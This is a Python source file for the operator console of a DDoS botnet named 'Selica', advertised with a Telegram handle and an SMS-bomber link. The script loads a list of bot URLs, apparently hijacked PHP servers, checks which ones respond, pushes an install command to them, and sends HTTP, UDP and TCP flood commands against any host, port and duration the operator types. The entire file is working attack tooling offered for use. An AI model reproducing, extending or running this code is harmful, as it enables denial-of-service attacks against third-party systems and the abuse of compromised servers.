import requests
import os
import ctypes
from threading import Thread

bots = []


def def_help():
	os.system("cls")
	print(r" ______     ______     __         __     ______     ______    ".center(90))
	print(r"/\  ___\   /\  ___\   /\ \       /\ \   /\  ___\   /\  __ \   ".center(90))
	print(r"\ \___  \  \ \  __\   \ \ \____  \ \ \  \ \ \____  \ \  __ \  ".center(90))
	print(r" \/\_____\  \ \_____\  \ \_____\  \ \_\  \ \_____\  \ \_\ \_\ ".center(90))
	print(r"  \/_____/   \/_____/   \/_____/   \/_/   \/_____/   \/_/\/_/ ".center(90))
	print("")
	print("╔═══════════════════════════════════════════════════╗".center(90))
	print("║                                                   ║".center(90))
	print("║         Selica php botnet | By ServerSide         ║".center(90))
	print("║              Created by @io_ping (tg)             ║".center(90))
	print("║       Best sms bomber: t.me/spamnetwork_bot       ║".center(90))
	print("║                                                   ║".center(90))
	print("╠═══════════════════════════════════════════════════╣".center(90))
	print("║               to add bots type 'bots'             ║".center(90))
	print("╠═══════════════════════════════════════════════════╣".center(90))
	print("║                                                   ║".center(90))
	print("║                      Methods                      ║".center(90))
	print("║                                                   ║".center(90))
	print("╠═══════════════════════════════════════════════════╣".center(90))
	print("║                      Layer7                       ║".center(90))
	print("║                                                   ║".center(90))
	print("║         HTTP-RAW | .1 <url> <time(seconds)>       ║".center(90))
	print("║        HTTP-RAND | .2 <url> <time(seconds)>       ║".center(90))
	print("║                                                   ║".center(90))
	print("╠═══════════════════════════════════════════════════╣".center(90))
	print("║                      Layer4                       ║".center(90))
	print("║                                                   ║".center(90))
	print("║        UDP FLOOD | .3 <ip> <port> <time(seconds)> ║".center(90))
	print("║                                                   ║".center(90))
	print("║ TCP_KILL CONNECT | .4 <ip> <port> <time(seconds)> ║".center(90))
	print("║ TCP_KILL    BYTE | .5 <ip> <port> <time(seconds)> ║".center(90))
	print("║ TCP_KILL     BIG | .6 <ip> <port> <time(seconds)> ║".center(90))
	print("║                                                   ║".center(90))
	print("╚═══════════════════════════════════════════════════╝".center(90))
	print("")

def set_console_title(title):
    try:
        ctypes.windll.kernel32.SetConsoleTitleW(title)
    except:
        pass



def get_bots():
	global bots
	list_bots = open("bots.txt").read().splitlines()
	for bot in list_bots:
	    try:
	        r = requests.get(bot + "?ping=qwe", timeout=1)
	        if "pong" in r.text:
	            bots.append(bot)
	            print("[+] " + bot + " good")
	            set_console_title(f"Selica | bots: {str(len(bots))} | @io_ping")
	    except:
	    	print("[-] " + bot + " bad")
	    
    
def send_request(url, data, timeout):
	try:
		requests.post(url, data=data, timeout=timeout)
	except:
		pass



def install_bots():
	global bots
	for bot in bots:
	    try:
	    	print("[+] " + bot + " all methods has been installed")
	    	data = {"stop":"1"}
	    	Thread(target=send_request, args=(bot + "?install=1", data, 1,)).start()
	    except:
	        pass


def stop():
	global bots
	for bot in bots:
	    try:
	    	data = {"stop":"1"}
	    	Thread(target=send_request, args=(bot, data, 1,)).start()
	    except:
	        pass
	print("all attacks has been stopped")



def http_raw(host, time):
	global bots
	for bot in bots:
	    try:
	    	data = {"method":'1', 
	    	"host":host, 
	    	"time":time}
	    	Thread(target=send_request, args=(bot, data, 1,)).start()
	    except:
	        pass

def http_rand(host, time):
	global bots
	for bot in bots:
	    try:
	    	data = {"method":'2', 
	    	"host":host, 
	    	"time":time}
	    	Thread(target=send_request, args=(bot, data, 1,)).start()
	    except:
	        pass



def udp_kill(host, port, time):
	global bots
	for bot in bots:
	    try:
	    	data = {"method":'3', 
	    	"host":host, 
	    	"port":port, 
	    	"time":time}
	    	Thread(target=send_request, args=(bot, data, 1,)).start()
	    except:
	        pass




def tcp_kill_connect(host, port, time):
	global bots
	for bot in bots:
	    try:
	    	data = {"method":'4', 
	    	"host":host, 
	    	"port":port, 
	    	"time":time}
	    	Thread(target=send_request, args=(bot, data, 1,)).start()
	    except:
	        pass


def tcp_kill_byte(host, port, time):
	global bots
	for bot in bots:
	    try:
	    	data = {"method":'5', 
	    	"host":host, 
	    	"port":port, 
	    	"time":time}
	    	Thread(target=send_request, args=(bot, data, 1,)).start()
	    except:
	        pass


def tcp_kill_big(host, port, time):
	global bots
	for bot in bots:
	    try:
	    	data = {"method":'6', 
	    	"host":host, 
	    	"port":port, 
	    	"time":time}
	    	Thread(target=send_request, args=(bot, data, 1,)).start()
	    except:
	        pass




def get_bot_list():
	global bots
	for bot in bots:
		print("[+] " + bot)



def main():
	while True:
		cmd = input("selica@user:~$ ").lower()

		if cmd == "bots":
			get_bots()

		elif cmd == "list":
			get_bot_list()

		elif cmd == "help":
			def_help()

		elif cmd == "cls":
			os.system('cls')
			print(r" ______     ______     __         __     ______     ______    ".center(90))
			print(r"/\  ___\   /\  ___\   /\ \       /\ \   /\  ___\   /\  __ \   ".center(90))
			print(r"\ \___  \  \ \  __\   \ \ \____  \ \ \  \ \ \____  \ \  __ \  ".center(90))
			print(r" \/\_____\  \ \_____\  \ \_____\  \ \_\  \ \_____\  \ \_\ \_\ ".center(90))
			print(r"  \/_____/   \/_____/   \/_____/   \/_/   \/_____/   \/_/\/_/ ".center(90))                                                           
			print("")

		elif cmd == "stop":
			stop()

		elif cmd == "install":
			install_bots()

		elif cmd == "refresh":
			global bots
			bots = []
			set_console_title(f"Selica | bots: 0 | @io_ping")
			get_bots()


		elif cmd.startswith(".1 "):
			try:
				cmd = cmd.replace(".1 ", '')
				host = cmd.split(" ")[0]
				time = cmd.split(" ")[1]
				http_raw(host, time)
				print("[+] attack sent")
			except:
				print("usage: .1 <host> <time>")

		elif cmd.startswith(".2 "):
			try:
				cmd = cmd.replace(".2 ", '')
				host = cmd.split(" ")[0]
				time = cmd.split(" ")[1]
				http_rand(host, time)
				print("[+] attack sent")
			except:
				print("usage: .2 <host> <time>")


		elif cmd.startswith(".3 "):
			try:
				cmd = cmd.replace(".3 ", '')
				host = cmd.split(" ")[0]
				port = cmd.split(" ")[1]
				time = cmd.split(" ")[2]
				udp_kill(host, port, time)
				print("[+] attack sent")
			except:
				print("usage: .3 <host> <port> <time>")


		elif cmd.startswith(".4 "):
			try:
				cmd = cmd.replace(".4 ", '')
				host = cmd.split(" ")[0]
				port = cmd.split(" ")[1]
				time = cmd.split(" ")[2]
				tcp_kill_connect(host, port, time)
				print("[+] attack sent")
			except:
				print("usage: .4 <host> <port> <time>")

		elif cmd.startswith(".5 "):
			try:
				cmd = cmd.replace(".5 ", '')
				host = cmd.split(" ")[0]
				port = cmd.split(" ")[1]
				time = cmd.split(" ")[2]
				tcp_kill_connect(host, port, time)
				print("[+] attack sent")
			except:
				print("usage: .5 <host> <port> <time>")

		elif cmd.startswith(".6 "):
			try:
				cmd = cmd.replace(".6 ", '')
				host = cmd.split(" ")[0]
				port = cmd.split(" ")[1]
				time = cmd.split(" ")[2]
				tcp_kill_connect(host, port, time)
				print("[+] attack sent")
			except:
				print("usage: .6 <host> <port> <time>")
		else:
			print("wrong command. type 'help' for get help")




if __name__ == '__main__':
	set_console_title(f"Selica | bots: 0 | @io_ping")
	os.system("cls")
	print(r" ______     ______     __         __     ______     ______    ".center(90))
	print(r"/\  ___\   /\  ___\   /\ \       /\ \   /\  ___\   /\  __ \   ".center(90))
	print(r"\ \___  \  \ \  __\   \ \ \____  \ \ \  \ \ \____  \ \  __ \  ".center(90))
	print(r" \/\_____\  \ \_____\  \ \_____\  \ \_\  \ \_____\  \ \_\ \_\ ".center(90))
	print(r"  \/_____/   \/_____/   \/_____/   \/_/   \/_____/   \/_/\/_/ ".center(90))    
	print("")                                                       
	print("type 'help' for get help")
	print("")
	main()
